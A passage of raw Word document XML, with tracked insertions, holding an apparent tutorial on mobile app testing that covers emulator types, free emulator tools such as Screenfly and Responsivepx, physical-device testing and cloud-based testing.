        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="367" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Emulators – </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The use of these is extremely useful in the</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>initial stages of development, as they allow quick and efficient checking of the app. The emulator is a system that runs software from one environment to another environment without changing the software itself. It duplicates the features and works on the real system.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="368"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69" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="370" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Types of Mobile Emulators</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="371" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="372" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Device Emulator- provided by device manufacturers</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="373" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="374" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Browser Emulator- simulates mobile browser environments.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="375" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Operating systems Emulator- Apple provides emulators for iPhones, Microsoft for Windows phones and Google Android phones</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="376"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77" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="378" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>List of few free and easy to use mobile device emulators</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="379" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="380" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>i.</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>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"http://www.mobilephoneemulator.com/" \o "http://www.mobilephoneemulator.com/"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Mobile Phone Emulator</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>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 Used to test handsets like iPhone, Blackberry, HTC, Samsung etc.</w:t>
        </w:r>
      </w:ins>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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F577C64" wp14:editId="7A4BCA56">
            <wp:extent cx="4572000" cy="3009900"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="53" name="Picture 53" descr="mobile device emulator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bile device emulator 2">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rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="381"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82" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="383" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>ii. </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>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"http://ready.mobi/launch.jsp?locale=en_EN" \o "http://ready.mobi/launch.jsp?locale=en_EN"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MobiReady</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>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 With this, not only can we test the web app, we can also check the code.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="384" w:author="Unknown"/>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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="489E466B" wp14:editId="7B005667">
            <wp:extent cx="3886200" cy="3764280"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="52" name="Picture 52" descr="mobile device emulator 3">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bile device emulator 3">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764280"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="385" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="386" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="387" w:author="Unknown">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"http://responsivepx.com/" \o "http://responsivepx.com/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Responsivepx</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>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 It checks the responses of the web pages, appearances and functionality of the websites.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="388" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="56FF9DF6" wp14:editId="275BB977">
            <wp:extent cx="4084320" cy="2735580"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="51" name="Picture 51" descr="mobile device emulator 4">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obile device emulator 4">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4320" cy="2735580"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="389"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90" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="391" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>iv. </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>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"http://quirktools.com/screenfly/" \o "http://quirktools.com/screenfly/"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Screenfly</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>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 It is a customizable tool and used to test websites under different categories.</w:t>
        </w:r>
      </w:ins>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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="04E6CE92" wp14:editId="258F5D54">
            <wp:extent cx="3345180" cy="2590800"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="50" name="Picture 50" descr="mobile device emulator 5">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bile device emulator 5">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rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="392"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93" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="394" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>3)</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> After a satisfactory level of development is complete for the mobile app, you could move to test on the </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>physical devices</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> for more real-life scenarios based testing.</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Default="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="395" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>4) Consider cloud computing based testing:</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://en.wikipedia.org/wiki/Cloud_computing" \o "Cloud Computing" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Cloud computing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>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is basically running devices on multiple systems or networks via the Internet where applications can be tested, updated and managed. For testing purposes, it creates the web-based mobile environment on a simulator to access the mobile app.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="396" w:author="Unknown"/>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397" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB3DF2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07FC3264" wp14:editId="7125D5C1">
            <wp:extent cx="3688080" cy="2865120"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="49" name="Picture 49" descr="cloud based mobile testi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loud based mobile testi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8080" cy="2865120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="398" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="399" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Pros:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="400" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="401" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Backup and recovery- Cloud computing automatically takes back up of your data from remote location making recovery and restoring of data easily. And also, the storage capacity is unlimited.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="402" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="403" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Clouds can be accessed from different devices and anywhere.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="404" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="405" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
